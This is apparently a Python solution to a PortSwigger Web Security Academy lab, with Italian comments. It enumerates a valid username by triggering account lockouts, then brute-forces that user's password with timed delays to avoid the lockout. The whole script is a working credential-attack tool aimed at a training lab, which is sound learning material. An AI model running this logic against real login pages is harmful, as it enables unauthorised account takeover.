```python
import requests
import time
from bs4 import BeautifulSoup

# This lab is vulnerable to username enumeration.
# It uses account locking, but this contains a logic flaw.
# To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

# bisogna arrivare al "lock" di un utente per decretarne l'esistenza!

# url dove sono pubblicati gli username da testare
users_url = 'https://portswigger.net/web-security/authentication/auth-lab-usernames'

# faccio la richiesta (get)
req = requests.get(users_url)

# preparo la zuppa con il body della richiesta di cui sopra (req.text)
soup = BeautifulSoup(req.text, 'html.parser')

# scelgo la classe che mi interessa e la printo. uso get_text() per avere SOLO gli username
users = soup.find( class_ = "code-scrollable" ).get_text()

# metto gli utenti in una lista, devo splittare in base al newline e strippare cose
userlist = []
for line in users.split('\n'):
    userlist.append(line.strip())

# printo la lista
print("Username list:\n")
print(userlist)
print("\n")

# url dove sono pubblicati le password da testare
pass_url = 'https://portswigger.net/web-security/authentication/auth-lab-passwords'

# faccio la richiesta (get)
req = requests.get(pass_url)

# preparo la zuppa con il body della richiesta di cui sopra (req.text)
soup = BeautifulSoup(req.text, 'html.parser')

# scelgo la classe che mi interessa e la printo. uso get_text() per avere SOLO gli username
passwords = soup.find( class_ = "code-scrollable" ).get_text()

# metto le password in una lista, devo splittare in base al newline e strippare cose
passlist = []
for line in passwords.split('\n'):
    passlist.append(line.strip())

# printo la lista di password
print("Password list:\n")
print(passlist)
print("\n")

# definisco l'url del form di login
url_login = 'https://0a0100c004dfa14a81a1118700090021.web-security-academy.net/login'

# creo una funzione che testi il login con un username costante ed una password costante (inverosimile)
def web_login(user):
    posterdati = { 'username': user, 'password': 'asdandrofl' }
    headers = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r1 = requests.post(url_login, data=posterdati, headers=headers)
    global response
    response = r1.text
    return response
# creo una funzione che testi il login con credenziali passate esplicitamente, e che aspetta 60 secondi
# tra una richiesta e l'altra (per evitare il lockout)
def auth_login(user, password):
    posterdati = { 'username': user, 'password': password }
    headers = { 'Content-Type': 'application/x-www-form-urlencoded' }
    time.sleep(60)
    r1 = requests.post(url_login, data=posterdati, headers=headers)
    global response
    response = r1.text
    return response

# questo ciclo esegue, per ogni username della lista, l'accesso per 5 volte con password volutamente errata.
# questo ci serve per "triggerare" il lockout e stabilire l'esistenza di un utente
stop_outer_loop = False
for i in userlist:
    for n in range(1, 6):
        web_login(i)
        if not 'Invalid username or password' in response:
            stop_outer_loop = True
            break
    if stop_outer_loop:
        break

print("Found username! " + i)

# aspetto 60 secondi per far scadere il lockout time
time.sleep(60)

# testo l'accesso con l'username trovato più sopra e l'elenco di password
for p in passlist:
    auth_login(i, p)
    if not 'Invalid username or password' in response:
        print("Login OK with user: " + i + " and password: " + p)
        break
    else:
        print("Testing user: " + i + " with password: " + p)
```